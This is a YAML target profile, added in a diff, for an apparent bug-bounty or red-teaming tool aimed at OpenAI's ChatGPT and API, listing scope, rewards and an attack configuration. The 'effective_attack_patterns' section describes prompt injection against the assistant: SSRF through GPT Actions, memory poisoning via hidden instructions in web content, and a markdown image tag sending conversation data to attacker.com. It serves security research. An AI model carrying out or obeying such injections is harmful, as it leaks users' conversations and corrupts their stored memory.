@@ -1,0 +1,135 @@
+# OpenAI (GPT/ChatGPT) - Target Profile
+# Last verified: 2026-04-06
+
+provider: openai
+display_name: "OpenAI (ChatGPT / GPT-4)"
+
+# Bug Bounty Program
+program:
+  platform: bugcrowd
+  url: "https://bugcrowd.com/openai"
+  type: bounty
+  notes: "Model safety jailbreaks are OUT of scope. Separate Red Teaming Network (invite-only)."
+
+# Scope
+scope:
+  model_safety_in_scope: false  # Only with concrete security impact
+  infrastructure_in_scope: true
+
+  in_scope_assets:
+    - "chatgpt.com and all subdomains"
+    - "api.openai.com"
+    - "platform.openai.com"
+    - "GPTs / custom GPT ecosystem"
+    - "GPT Actions (tool calls to external services)"
+    - "ChatGPT mobile apps (iOS, Android)"
+    - "DALL-E web interface"
+    - "Authentication and payment infrastructure"
+    - "ChatGPT plugins"
+
+  out_of_scope:
+    - "Model jailbreaks / content policy bypasses"
+    - "DAN-style jailbreaks"
+    - "Hallucinations"
+    - "Model generating incorrect code"
+    - "Getting model to say it's not an AI"
+    - "General prompt injection WITHOUT security impact"
+
+  in_scope_with_conditions:
+    - description: "Prompt injection with concrete security impact"
+      examples:
+        - "PI in GPT Action that exfiltrates user data to attacker server"
+        - "PI that causes unauthorized tool execution"
+        - "Indirect PI that steals conversation data"
+      requirement: "Must demonstrate real security impact beyond content policy bypass"
+
+# Rewards (USD)
+rewards:
+  infrastructure:
+    critical: [6500, 20000]
+    high: [2000, 6500]
+    medium: [500, 2000]
+    low: [200, 500]
+
+# API Configuration
+api:
+  base_url: "https://api.openai.com/v1"
+  auth_type: "api_key"
+  auth_header: "Authorization: Bearer"
+  models:
+    - "gpt-5.4"
+    - "gpt-5.4-mini"
+    - "gpt-5.4-nano"
+    - "gpt-5.3-codex"
+  supports_multimodal: true
+  supports_tools: true
+  supports_multi_turn: true
+  max_context_tokens: 128000
+
+# Rate Limits
+rate_limits:
+  requests_per_minute: 60
+  tokens_per_minute: 60000
+  daily_budget_aud: 30.00
+
+# Attack Configuration
+attack_config:
+  priority_surfaces:
+    - "gpt_actions_ssrf"          # SSRF through GPT Actions to external services
+    - "data_exfil_via_markdown"    # Markdown image rendering for data exfil
+    - "cross_user_data_isolation"  # Seeing another user's conversations
+    - "plugin_oauth_abuse"         # OAuth flow abuse in plugin auth
+    - "memory_manipulation"        # Indirect PI manipulating persistent memory
+    - "enterprise_team_isolation"  # Cross-org data access in Enterprise/Team
+
+  known_defenses:
+    - "RLHF alignment"
+    - "Content filter / moderation API"
+    - "Markdown rendering restrictions (partially)"
+    - "Plugin/Action sandboxing"
+    - "Rate limiting per user/org"
+
+  effective_attack_patterns:
+    gpt_actions_ssrf:
+      description: "GPT Actions make HTTP requests to configured URLs. Manipulate the LLM to send requests to internal/attacker-controlled URLs."
+      technique: "Craft conversation that makes GPT call an Action with attacker-controlled URL parameters"
+      evidence_needed: "HTTP request received at attacker server with sensitive data"
+
+    markdown_image_exfil:
+      description: "Indirect PI causes GPT to render markdown image tag that exfils conversation data"
+      technique: "Inject content that makes GPT output ![img](https://attacker.com/exfil?data=CONVERSATION_CONTENT)"
+      evidence_needed: "Data received at attacker-controlled endpoint"
+
+    memory_poisoning:
+      description: "Indirect PI via shared content that permanently alters GPT's memory about the user"
+      technique: "Craft content (webpage, document) with hidden instructions to save attacker-controlled info to memory"
+      evidence_needed: "Persistent memory entry created from external content"
+
+  known_patched:
+    - "Basic markdown image exfil (some mitigations in place)"
+    - "Simple plugin redirect attacks"
+    - "Direct system prompt extraction (mostly)"
+
+  severity_criteria:
+    critical: "Cross-user data access, RCE, authentication bypass, mass data exposure"
+    high: "Significant data exfiltration via Actions/plugins, cross-org isolation break"
+    medium: "Limited data exposure, plugin OAuth issues, memory manipulation"
+    low: "Minor information disclosure, rate limit bypass"
+
+# Reporting
+reporting:
+  format: "bugcrowd"
+  required_evidence:
+    - "Full HTTP request/response chain"
+    - "Proof of security impact (data exfil, unauthorized access)"
+    - "Step-by-step reproduction"
+    - "Affected model/product version"
+    - "Impact statement explaining real-world risk"
+
+  tips:
+    - "Focus on SECURITY IMPACT, not content bypasses"
+    - "GPT Actions and plugin ecosystem are richest surface"
+    - "Cross-user and cross-org isolation bugs are highest value"
+    - "Markdown image exfil requires proving data actually reaches attacker"
+    - "Memory manipulation needs to show persistence and impact"
+    - "They have a separate Red Teaming Network for model safety - apply there"
